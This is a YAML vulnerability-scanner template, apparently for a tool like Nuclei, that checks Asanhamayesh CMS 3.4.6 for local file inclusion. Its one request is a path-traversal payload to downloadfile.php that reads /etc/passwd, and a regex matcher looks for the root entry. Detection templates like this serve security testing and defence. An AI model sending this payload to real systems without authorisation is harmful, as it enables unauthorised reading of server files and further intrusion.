id: asanhamayesh-lfi
name: Asanhamayesh CMS 3.4.6 - Local File Inclusion
severity: high
confidence: tentative
description: Asanhamayesh CMS 3.4.6 is vulnerable to local file inclusion.
reference: CWE-22
tags:
- asanhamayesh
- lfi
- traversal
- vuln
requests:
- method: GET
  path: /downloadfile.php?file=../../../../../../../../../../etc/passwd
  matchers:
  - type: regex
    regex:
    - root:[x*]:0:0
  - type: status
    status:
    - 200
  condition: and
